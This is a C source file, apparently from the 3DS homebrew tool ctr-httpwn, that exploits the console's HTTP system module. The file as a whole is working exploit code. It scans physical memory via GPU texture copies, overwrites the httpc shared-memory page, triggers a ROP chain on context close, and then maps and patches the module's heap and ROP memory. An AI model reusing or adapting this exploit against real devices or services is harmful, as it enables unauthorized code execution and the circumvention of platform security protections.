#include <stdlib.h>
#include <malloc.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <3ds.h>

#include "cmpblock_bin.h"

extern Handle __httpc_servhandle;
extern u32 *__httpc_sharedmem_addr;

u8 *http_codebin_buf;
u32 *http_codebin_buf32;
u32 http_codebin_size;

Result init_hax_sharedmem(u32 *tmpbuf);
Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_sharedmem_size, vu32 *ropvmem_sharedmem, u32 ropvmem_sharedmem_size);

Result loadcodebin(u64 programid, FS_MediaType mediatype, u8 **codebin_buf, u32 *codebin_size);

void displaymessage_waitbutton()
{
	printf("\nPress the A button to continue.\n");
	while(1)
	{
		gspWaitForVBlank();
		hidScanInput();
		if(hidKeysDown() & KEY_A)break;
	}
}

Result _HTTPC_CloseContext(Handle handle, Handle contextHandle, Handle *httpheap_sharedmem_handle, Handle *ropvmem_sharedmem_handle, Handle *httpc_sslc_handle)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=IPC_MakeHeader(0x3,1,0); // 0x30040
	cmdbuf[1]=contextHandle;
	
	Result ret=0;
	if(R_FAILED(ret=svcSendSyncRequest(handle)))return ret;

	if(cmdbuf[1]==0)
	{
		if(cmdbuf[0]!=0x00030045)return -1;//The ROP is supposed to return a custom cmdreply.
		if(cmdbuf[2]!=(0x10 | ((0x2-1)<<26)) || cmdbuf[5]!=0x0)return -1;

		if(httpheap_sharedmem_handle)*httpheap_sharedmem_handle = cmdbuf[3];
		if(ropvmem_sharedmem_handle)*ropvmem_sharedmem_handle = cmdbuf[4];
		if(httpc_sslc_handle)*httpc_sslc_handle = cmdbuf[6];
	}

	return cmdbuf[1];
}

Result _httpcCloseContext(httpcContext *context, Handle *httpheap_sharedmem_handle, Handle *ropvmem_sharedmem_handle, Handle *httpc_sslc_handle)
{
	Result ret=0;

	svcCloseHandle(context->servhandle);
	ret = _HTTPC_CloseContext(__httpc_servhandle, context->httphandle, httpheap_sharedmem_handle, ropvmem_sharedmem_handle, httpc_sslc_handle);

	return ret;
}

//This searches physmem for the page which starts with the data stored in cmpblock_bin. The first byte in cmpblock is XORed with 0x01 to avoid detecting the cmpblock in physmem.
Result locate_sharedmem_linearaddr(u32 **linearaddr)
{
	u8 *tmpbuf;
	u32 chunksize = 0x100000;
	u32 linearpos, bufpos, size;
	u32 i;
	u32 xorval;
	int found = 0;

	*linearaddr = NULL;

	tmpbuf = linearAlloc(chunksize);
	if(tmpbuf==NULL)
	{
		printf("Failed to allocate mem for tmpbuf.\n");
		return -1;
	}

	size = osGetMemRegionSize(MEMREGION_APPLICATION);

	for(linearpos=0; linearpos<size; linearpos+= chunksize)
	{
		*linearaddr = (u32*)(0x30000000+linearpos);

		memset(tmpbuf, 0, chunksize);
		GSPGPU_FlushDataCache(tmpbuf, chunksize);

		GX_TextureCopy(*linearaddr, 0, (u32*)tmpbuf, 0, chunksize, 0x8);
		gspWaitForPPF();

		for(bufpos=0; bufpos<chunksize; bufpos+= 0x1000)
		{
			found = 1;

			for(i=0; i<cmpblock_bin_size; i++)
			{
				xorval = 0;
				if(i==0)xorval = 1;

				if(tmpbuf[bufpos + i] != (cmpblock_bin[i] ^ xorval))
				{
					found = 0;
					break;
				}
			}

			if(found)
			{
				*linearaddr = (u32*)(0x30000000+linearpos+bufpos);
				break;
			}
		}
		if(found)break;
	}

	linearFree(tmpbuf);

	if(!found)return -1;

	return 0;
}

Result writehax_sharedmem_physmem(u32 *linearaddr)
{
	Result ret=0;
	u32 chunksize = 0x1000;
	u32 *tmpbuf;

	//Allocate memory for the sharedmem page, then copy the sharedmem physmem data into the buf.

	tmpbuf = linearAlloc(chunksize);
	if(tmpbuf==NULL)
	{
		printf("Failed to allocate mem for tmpbuf.\n");
		return -1;
	}

	memset(tmpbuf, 0, chunksize);
	GSPGPU_FlushDataCache(tmpbuf, chunksize);

	GX_TextureCopy(linearaddr, 0, tmpbuf, 0, chunksize, 0x8);
	gspWaitForPPF();

	ret = init_hax_sharedmem(tmpbuf);
	if(ret)
	{
		linearFree(tmpbuf);
		return ret;
	}

	//Flush dcache for the modified sharedmem, then copy the data back into the sharedmem physmem.
	GSPGPU_FlushDataCache(tmpbuf, chunksize);

	GX_TextureCopy(tmpbuf, 0, linearaddr, 0, chunksize, 0x8);
	gspWaitForPPF();

	linearFree(tmpbuf);

	return 0;
}

Result http_haxx(char *requrl)
{
	Result ret=0;
	httpcContext context;
	u32 *linearaddr = NULL;
	Handle httpheap_sharedmem_handle=0;
	Handle ropvmem_sharedmem_handle=0;
	vu32 *httpheap_sharedmem = NULL;
	u32 httpheap_sharedmem_size = 0x22000;
	vu32 *ropvmem_sharedmem = NULL;
	u32 ropvmem_sharedmem_size = 0x1000;
	Handle httpc_sslc_handle = 0;
	u32 i;

	ret = httpcOpenContext(&context, HTTPC_METHOD_POST, requrl, 1);
	if(ret!=0)return ret;

	ret = httpcAddPostDataAscii(&context, "form_name", "form_value");
	if(ret!=0)
	{
		httpcCloseContext(&context);
		return ret;
	}

	//Locate the physmem for the httpc sharedmem. With the current cmpblock, there can only be one POST struct that was ever written into sharedmem, with the name/value from above.
	printf("Searching for the httpc sharedmem in physmem...\n");
	ret = locate_sharedmem_linearaddr(&linearaddr);
	if(ret!=0)
	{
		printf("Failed to locate the sharedmem in physmem.\n");
		httpcCloseContext(&context);
		return ret;
	}

	printf("Successfully located the linearaddr for sharedmem: 0x%08x.\n", (unsigned int)linearaddr);

	printf("Writing the haxx to physmem...\n");
	ret = writehax_sharedmem_physmem(linearaddr);
	if(ret!=0)
	{
		printf("Failed to setup the haxx.\n");
		httpcCloseContext(&context);
		return ret;
	}

	printf("Triggering the haxx...\n");
	ret = _httpcCloseContext(&context, &httpheap_sharedmem_handle, &ropvmem_sharedmem_handle, &httpc_sslc_handle);
	if(R_FAILED(ret))
	{
		printf("httpcCloseContext returned 0x%08x.\n", (unsigned int)ret);
		if(ret==0xC920181A)printf("This error means the HTTP sysmodule crashed.\n");
		return ret;
	}

	printf("httpc_sslc_handle = 0x%08x.\n", (unsigned int)httpc_sslc_handle);

	httpheap_sharedmem = (vu32*)mappableAlloc(httpheap_sharedmem_size);
	if(httpheap_sharedmem==NULL)
	{
		ret = -2;
		svcCloseHandle(httpheap_sharedmem_handle);
		svcCloseHandle(ropvmem_sharedmem_handle);
		svcCloseHandle(httpc_sslc_handle);
		return ret;
	}

	ropvmem_sharedmem = (vu32*)mappableAlloc(ropvmem_sharedmem_size);
	if(ropvmem_sharedmem==NULL)
	{
		ret = -3;
		mappableFree((void*)httpheap_sharedmem);
		svcCloseHandle(httpheap_sharedmem_handle);
		svcCloseHandle(ropvmem_sharedmem_handle);
		svcCloseHandle(httpc_sslc_handle);
		return ret;
	}

	if(R_FAILED(ret=svcMapMemoryBlock(httpheap_sharedmem_handle, (u32)httpheap_sharedmem, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE)))
	{
		svcCloseHandle(httpheap_sharedmem_handle);
		mappableFree((void*)httpheap_sharedmem);
		httpheap_sharedmem = NULL;

		svcCloseHandle(ropvmem_sharedmem_handle);
		mappableFree((void*)ropvmem_sharedmem);
		ropvmem_sharedmem = NULL;

		svcCloseHandle(httpc_sslc_handle);

		printf("svcMapMemoryBlock with the httpheap sharedmem failed: 0x%08x.\n", (unsigned int)ret);
		return ret;
	}

	if(R_FAILED(ret=svcMapMemoryBlock(ropvmem_sharedmem_handle, (u32)ropvmem_sharedmem, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE)))
	{
		svcUnmapMemoryBlock(httpheap_sharedmem_handle, (u32)httpheap_sharedmem);
		svcCloseHandle(httpheap_sharedmem_handle);
		mappableFree((void*)httpheap_sharedmem);
		httpheap_sharedmem = NULL;

		svcCloseHandle(ropvmem_sharedmem_handle);
		mappableFree((void*)ropvmem_sharedmem);
		ropvmem_sharedmem = NULL;

		svcCloseHandle(httpc_sslc_handle);

		printf("svcMapMemoryBlock with the ropvmem sharedmem failed: 0x%08x.\n", (unsigned int)ret);
		return ret;
	}

	printf("Successfully mapped the httpheap+ropvmem sharedmem.\n");

	printf("Initializing the haxx under the httpheap+ropvmem sharedmem...\n");
	ret = setuphaxx_httpheap_sharedmem(httpheap_sharedmem, httpheap_sharedmem_size, ropvmem_sharedmem, ropvmem_sharedmem_size);
	if(R_FAILED(ret))printf("Failed to setup the haxx in the httpheap sharedmem: 0x%08x.\n", (unsigned int)ret);

	if(ret==0)printf("Finalizing...\n");

	svcUnmapMemoryBlock(httpheap_sharedmem_handle, (u32)httpheap_sharedmem);
	svcCloseHandle(httpheap_sharedmem_handle);
	mappableFree((void*)httpheap_sharedmem);
	httpheap_sharedmem = NULL;

	svcUnmapMemoryBlock(ropvmem_sharedmem_handle, (u32)httpheap_sharedmem);
	svcCloseHandle(ropvmem_sharedmem_handle);
	mappableFree((void*)ropvmem_sharedmem);
	ropvmem_sharedmem = NULL;

	svcCloseHandle(httpc_sslc_handle);

	if(ret)return ret;

	printf("Verifying that the haxx was setup correctly...\n");

	for(i=0; i<2; i++)
	{
		printf("Opening the context...\n");
		ret = httpcOpenContext(&context, HTTPC_METHOD_POST, requrl, 1);
		if(ret!=0)return ret;

		printf("Running httpcAddPostDataAscii...\n");
		ret = httpcAddPostDataAscii(&context, "form_name", "form_value");
		if(ret!=0)
		{
			httpcCloseContext(&context);
			return ret;
		}

		printf("Closing the context...\n");
		ret = httpcCloseContext(&context);
		if(R_FAILED(ret))
		{
			printf("httpcCloseContext returned 0x%08x.\n", (unsigned int)ret);
			if(ret==0xC920181A)printf("This error means the HTTP sysmodule crashed.\n");
			return ret;
		}

		printf("Starting the next verification round...\n");
	}

	return 0;
}

Result httpwn_setup()
{
	Result ret = 0;
	u64 http_sysmodule_titleid = 0x0004013000002902ULL;
	AM_TitleEntry title_entry;

	ret = amInit();
	if(ret!=0)
	{
		printf("Failed to initialize AM: 0x%08x.\n", (unsigned int)ret);
		if(ret==0xd8e06406)
		{
			printf("The AM service is inaccessible. With the *hax payloads this should never happen. This is normal with plain ninjhax v1.x: this app isn't usable from ninjhax v1.x without any further hax.\n");
		}
		return ret;
	}

	ret = AM_ListTitles(0, 1, &http_sysmodule_titleid, &title_entry);
	amExit();
	if(ret!=0)
	{
		printf("Failed to get the HTTP sysmodule title-version: 0x%08x.\n", (unsigned int)ret);
		return ret;
	}

	if(title_entry.version != 13318)
	{
		printf("The installed HTTP sysmodule version(v%u) is not supported. The sysmodule version must be the version from system-version >=9.6.0-X.\n", title_entry.version);
		return -1;
	}

	http_codebin_buf = NULL;
	http_codebin_buf32 = NULL;
	http_codebin_size = 0;

	ret = loadcodebin(http_sysmodule_titleid, MEDIATYPE_NAND, &http_codebin_buf, &http_codebin_size);
	if(R_FAILED(ret))
	{
		printf("Failed to load the HTTP sysmodule codebin: 0x%08x.\n", (unsigned int)ret);
		return ret;
	}

	http_codebin_buf32 = (u32*)http_codebin_buf;

	ret = httpcInit(0x1000);
	if(ret!=0)
	{
		printf("Failed to initialize HTTPC: 0x%08x.\n", (unsigned int)ret);
		if(ret==0xd8e06406)
		{
			printf("The HTTPC service is inaccessible. With the *hax payload this may happen if the process this app is running under doesn't have access to that service. Please try rebooting the system, boot *hax payload, then directly launch the app.\n");
		}

		free(http_codebin_buf);

		return ret;
	}

	printf("Preparing the haxx...\n");
	ret = http_haxx("http://localhost/");//URL doesn't matter much since this won't actually be requested over the network.
	httpcExit();
	free(http_codebin_buf);
	if(ret!=0)
	{
		printf("Haxx setup failed: 0x%08x.\n", (unsigned int)ret);
		return ret;
	}

	return ret;
}

int main(int argc, char **argv)
{
	Result ret = 0;

	// Initialize services
	gfxInitDefault();

	consoleInit(GFX_TOP, NULL);

	printf("ctr-httpwn %s by yellows8.\n", VERSION);

	ret = httpwn_setup();

	if(ret==0)printf("Done.\n");

	if(ret!=0)printf("An error occured. If this is an actual issue not related to user failure, please report this to here if it persists(or comment on an already existing issue if needed), with a screenshot: https://github.com/yellows8/ctr-httpwn/issues\n");

	printf("Press the START button to exit.\n");
	// Main loop
	while (aptMainLoop())
	{
		gspWaitForVBlank();
		hidScanInput();

		u32 kDown = hidKeysDown();
		if (kDown & KEY_START)
			break; // break in order to return to hbmenu
	}

	// Exit services
	gfxExit();
	return 0;
}

